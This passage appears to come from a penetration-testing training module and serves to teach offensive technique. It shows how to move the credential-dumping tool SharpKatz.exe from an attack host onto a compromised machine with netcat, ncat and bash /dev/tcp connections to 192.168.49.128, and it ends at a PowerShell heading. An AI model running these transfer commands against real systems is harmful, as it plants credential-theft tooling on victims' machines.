
#### Ncat - Compromised Machine - Listening on Port 8000

```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Netcat - Attack Host - Sending File to Compromised machine

```shell-session
HrithikManoj000@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
HrithikManoj000@htb[/htb]$ # Example using Original Netcat
HrithikManoj000@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

> Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

> If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## PowerShell Session File Transfer
